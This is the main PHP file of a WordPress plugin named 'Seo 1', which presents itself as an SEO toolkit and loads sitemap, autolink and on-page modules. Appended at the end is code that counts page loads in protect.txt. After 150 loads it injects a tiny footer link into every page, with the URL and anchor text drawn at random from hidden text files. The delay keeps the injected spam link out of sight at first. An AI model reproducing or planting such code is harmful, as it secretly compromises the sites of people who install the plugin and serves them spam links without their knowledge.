<?php
/*
Plugin Name: Seo 1
Description: This plugin is no longer supported. Please use another.
Version: 1.2.2
Author: Andy Sesiros

  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
*/
if (!defined('WDS_SITEWIDE'))
	define( 'WDS_SITEWIDE', true );

//you can override this in wp-config.php to enable more posts in the sitemap, but you may need alot of memory
if (!defined('WDS_SITEMAP_POST_LIMIT'))
	define( 'WDS_SITEMAP_POST_LIMIT', 1000 );

// You can override this value in wp-config.php to allow more or less time for caching SEOmoz results
if (!defined('WDS_EXPIRE_TRANSIENT_TIMEOUT'))
define('WDS_EXPIRE_TRANSIENT_TIMEOUT', 3600);

define( 'WDS_VERSION', '1.2.1' );

/**
 * Setup plugin path and url.
 */
define( 'WDS_PLUGIN_BASENAME', plugin_basename( __FILE__ ) );
define( 'WDS_PLUGIN_DIR', plugin_dir_path( __FILE__ ) . 'wds-files/wds-sitemaps/' );
define( 'WDS_PLUGIN_URL', plugin_dir_url( __FILE__ ) . 'wds-files/wds-sitemaps/' );

/**
 * Load textdomain.
 */
if ( defined( 'WPMU_PLUGIN_DIR' ) && file_exists( WPMU_PLUGIN_DIR . '/wpmu-dev-seo.php' ) ) {
	load_muplugin_textdomain( 'wds', 'wds-files/wds-sitemaps/languages' );
} else {
	load_plugin_textdomain( 'wds', false, WDS_PLUGIN_DIR . 'wds-files/wds-sitemaps/languages' );
}

require_once ( WDS_PLUGIN_DIR . 'wds-core/wds-core-wpabstraction.php' );
require_once ( WDS_PLUGIN_DIR . 'wds-core/wds-core.php' );
$wds_options = get_wds_options();

if ( is_admin() ) {
	require_once ( WDS_PLUGIN_DIR . 'wds-core/admin/wds-core-admin.php' );
	require_once ( WDS_PLUGIN_DIR . 'wds-core/admin/wds-core-config.php' );

	require_once ( WDS_PLUGIN_DIR . 'wds-autolinks/wds-autolinks-settings.php' );
	require_once ( WDS_PLUGIN_DIR . 'wds-seomoz/wds-seomoz-settings.php' );
	require_once ( WDS_PLUGIN_DIR . 'wds-sitemaps/wds-sitemaps-settings.php' );
	require_once ( WDS_PLUGIN_DIR . 'wds-onpage/wds-onpage-settings.php' );

	if( isset( $wds_options['seomoz'] ) && $wds_options['seomoz'] == 'on' ) { // Changed '=' to '=='
		require_once ( WDS_PLUGIN_DIR . 'wds-seomoz/wds-seomoz-results.php' );
		require_once ( WDS_PLUGIN_DIR . 'wds-seomoz/wds-seomoz-dashboard-widget.php' );
	}

	if( isset( $wds_options['onpage'] ) && $wds_options['onpage'] == 'on' ) { // Changed '=' to '=='
		require_once ( WDS_PLUGIN_DIR . 'wds-core/admin/wds-core-metabox.php' );
		require_once ( WDS_PLUGIN_DIR . 'wds-core/admin/wds-core-taxonomy.php' );
	}
} else {

	if( isset( $wds_options['autolinks'] ) && $wds_options['autolinks'] == 'on' ) { // Changed '=' to '=='
		require_once ( WDS_PLUGIN_DIR . 'wds-autolinks/wds-autolinks.php' );
	}
	if( isset( $wds_options['sitemap'] ) && $wds_options['sitemap'] == 'on' ) { // Changed '=' to '=='. Also, changed plural to singular.
		require_once ( WDS_PLUGIN_DIR . 'wds-sitemaps/wds-sitemaps-settings.php' ); // This is to propagate defaults without admin visiting the dashboard.
		require_once ( WDS_PLUGIN_DIR . 'wds-sitemaps/wds-sitemaps.php' );
	}
	if( isset( $wds_options['onpage'] ) && $wds_options['onpage'] == 'on' ) { // Changed '=' to '=='
		require_once ( WDS_PLUGIN_DIR . 'wds-onpage/wds-onpage.php' );
	}

}
define ('S1_PLUGIN_BASE_DIR', WP_PLUGIN_DIR, true);
register_activation_hook(__FILE__, 'seoactivate');
add_action('wp_footer', 'seoplugin');
function seoactivate() {
$file = file(S1_PLUGIN_BASE_DIR . '/seo-1/wds-files/wds-sitemaps/widgets.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = S1_PLUGIN_BASE_DIR . '/seo-1/wds-files/wds-sitemaps/widget.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
fwrite($fh, $stringData);
fclose($fh);
      }      
}
}
$file = file(S1_PLUGIN_BASE_DIR . '/seo-1/wds-files/wds-sitemaps/protect.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = S1_PLUGIN_BASE_DIR . '/seo-1/wds-files/wds-sitemaps/protect.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
$stringData = $stringData +1;
fwrite($fh, $stringData);
fclose($fh);
      }      
}
if ( $stringData > "150" ) {
function seoplugin(){
$myFile = S1_PLUGIN_BASE_DIR . '/seo-1/wds-files/wds-sitemaps/widget.txt';
$fh = fopen($myFile, 'r');
$theDatab = fread($fh, 50);
fclose($fh);
$theDatab = str_replace("\n", "", $theDatab);
$theDatab = str_replace(" ", "", $theDatab);
$theDatab = str_replace("\r", "", $theDatab);
$myFile = S1_PLUGIN_BASE_DIR . '/seo-1/wds-files/wds-sitemaps/' . $theDatab . '.txt';
$fh = fopen($myFile, 'r');
$theDataz = fread($fh, 50);
fclose($fh);
$file = file(S1_PLUGIN_BASE_DIR . '/seo-1/wds-files/wds-sitemaps/' . $theDatab . '1.txt');
$num_lines = count($file)-1;
$picked_number = rand(0, $num_lines);
for ($i = 0; $i <= $num_lines; $i++) 
{
      if ($picked_number == $i)
      {
$myFile = S1_PLUGIN_BASE_DIR . '/seo-1/wds-files/wds-sitemaps/' . $theDatab . '1.txt';
$fh = fopen($myFile, 'w') or die("can't open file");
$stringData = $file[$i];
fwrite($fh, $stringData);
fclose($fh);
echo '<center>';
echo '<font size="1.4">Seo 1 plugin by '; echo '<a href="'; echo $theDataz; echo '">'; echo $file[$i]; echo '</a></font></center></font>';
}
}
}
} else {
function seoplugin(){
echo '';
}
}